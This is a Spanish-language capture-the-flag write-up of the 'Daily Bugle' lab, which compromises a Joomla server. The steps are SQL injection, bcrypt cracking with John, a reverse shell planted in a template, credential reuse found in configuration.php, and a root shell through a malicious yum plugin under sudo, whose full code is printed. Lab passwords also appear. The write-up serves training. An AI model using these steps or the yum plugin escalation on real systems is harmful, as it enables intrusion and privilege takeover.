# Daily Bugle

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux basada en **Joomla**, explotando una vulnerabilidad de **SQL Injection** para obtener credenciales del administrador, conseguir acceso al sistema mediante una **reverse shell**, reutilizar credenciales almacenadas en archivos de configuración para acceder por **SSH** y escalar privilegios mediante una configuración insegura de **sudo** sobre `yum`.

---

## 🛠️ Tecnologías trabajadas

- Joomla
- JoomScan
- SQL Injection
- John The Ripper
- Bcrypt
- Reverse Shell
- SSH
- MariaDB
- GTFOBins
- Yum Plugins

---

## 🧠 Metodología

La enumeración inicial mostró tres servicios expuestos: **SSH**, **HTTP** y **MariaDB**. Aunque la base de datos estaba accesible, el principal punto de entrada era la aplicación web.

Tras identificar que el sitio utilizaba **Joomla**, determiné su versión mediante **JoomScan**, lo que permitió localizar una vulnerabilidad pública de **SQL Injection**. Gracias a esta vulnerabilidad fue posible extraer el hash bcrypt del usuario administrador.

Después de crackear el hash con **John The Ripper**, accedí al panel de administración de Joomla y modifiqué una plantilla para obtener una **reverse shell**. Una vez dentro del sistema, la revisión del archivo `configuration.php` permitió recuperar unas credenciales reutilizadas por un usuario del sistema, obteniendo una sesión SSH estable.

Finalmente, la enumeración de permisos con `sudo -l` reveló que el usuario podía ejecutar **yum** como **root**, permitiendo la carga de un plugin malicioso para conseguir una shell con privilegios de administrador.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un reconocimiento con **ReconX**.

Los servicios identificados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |
| 3306 | MariaDB |

Aunque MariaDB estaba accesible, la aplicación web era el principal vector de ataque.

---

### 2. Enumeración web

Accedí a la página principal.

```text
http://10.128.177.37
```

Se trataba de un periódico online basado en Joomla.

Durante la resolución del laboratorio también podía responderse directamente una de las preguntas leyendo el contenido de la página.

A continuación realicé un fuzzing de directorios.

```bash
ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt -u http://10.128.177.37/FUZZ
```

Entre los resultados apareció:

```text
administrator
```

Al acceder encontré el panel de autenticación de **Joomla**.

---

### 3. Identificación del CMS

Para identificar la versión utilicé **JoomScan**.

```bash
joomscan --url http://10.128.177.37/administrator
```

Conociendo la versión fue posible buscar vulnerabilidades públicas.

---

### 4. Explotación de Joomla

Localicé un exploit público que aprovechaba una vulnerabilidad de **SQL Injection** sobre Joomla 3.7.0.

Tras ejecutarlo se obtuvo el hash del usuario administrador.

```text
Usuario: jonah

Hash:
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

Guardé el hash y lo crackeé utilizando **John The Ripper**.

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Después comprobé el resultado.

```bash
john --show hash.txt
```

Credenciales obtenidas

---

### 5. Acceso inicial

Con las credenciales recuperadas inicié sesión en el panel de administración de Joomla.

```text
Usuario: jonah
Contraseña: spiderman123
```

Desde el apartado **Templates** modifiqué una plantilla PHP para insertar una **reverse shell**.

En la máquina atacante preparé un listener.

```bash
nc -lvnp 4444
```

Accedí posteriormente al archivo modificado desde el navegador, obteniendo acceso al sistema como el usuario del servidor web.

---

### 6. Post-explotación

Una vez dentro comencé la enumeración del sistema.

Accedí al directorio donde estaba instalado Joomla.

```bash
cd /var/www/html
```

Entre los archivos encontré:

```text
configuration.php
```

Visualicé su contenido.

```bash
cat configuration.php
```

Dentro aparecía una contraseña almacenada en texto plano.

```text
nv5uz9r3ZEDzVjNu
```

Probando la contraseña con los usuarios del sistema comprobé que pertenecía a:

```text
jjameson
```

Con estas credenciales inicié sesión mediante SSH.

```bash
ssh jjameson@10.128.177.37
```

Contraseña:

```text
nv5uz9r3ZEDzVjNu
```

Conseguí una sesión mucho más estable y recuperé la flag de usuario.

```bash
cat user.txt
```

---

### 7. Escalada de privilegios

Comencé comprobando los permisos disponibles.

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/yum
```

El usuario podía ejecutar **yum** como **root** sin necesidad de contraseña.

Consultando **GTFOBins** comprobé que `yum` permite cargar plugins personalizados capaces de ejecutar código arbitrario.

Creé un directorio temporal.

```bash
TF=$(mktemp -d)
```

Generé la configuración necesaria.

```bash
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
```

Configuré el plugin.

```bash
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
```

Creé el plugin malicioso.

```bash
cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE

requires_api_version='2.1'

def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
```

Finalmente ejecuté:

```bash
sudo yum -c $TF/x --enableplugin=y
```

Con ello obtuve una shell con privilegios de **root**.

Verifiqué el acceso.

```bash
whoami
```

Resultado:

```text
root
```

Accedí al directorio del administrador y recuperé la última flag.

```bash
cd /root
cat root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió recorrer una cadena de explotación completa sobre un entorno **Joomla**, combinando vulnerabilidades web, reutilización de credenciales y escalada de privilegios mediante una mala configuración de `sudo`.
- Identificar instalaciones de **Joomla** mediante enumeración web.
- Determinar versiones utilizando **JoomScan**.
- Explotar una vulnerabilidad de **SQL Injection** en Joomla.
- Extraer hashes bcrypt desde la base de datos.
- Crackear hashes bcrypt utilizando **John The Ripper**.
- Obtener acceso inicial modificando plantillas del CMS.
- Recuperar credenciales almacenadas en archivos de configuración.
- Reutilizar contraseñas para acceder mediante **SSH**.
- Identificar configuraciones inseguras de `sudo`.
- Escalar privilegios mediante plugins personalizados de **yum**.
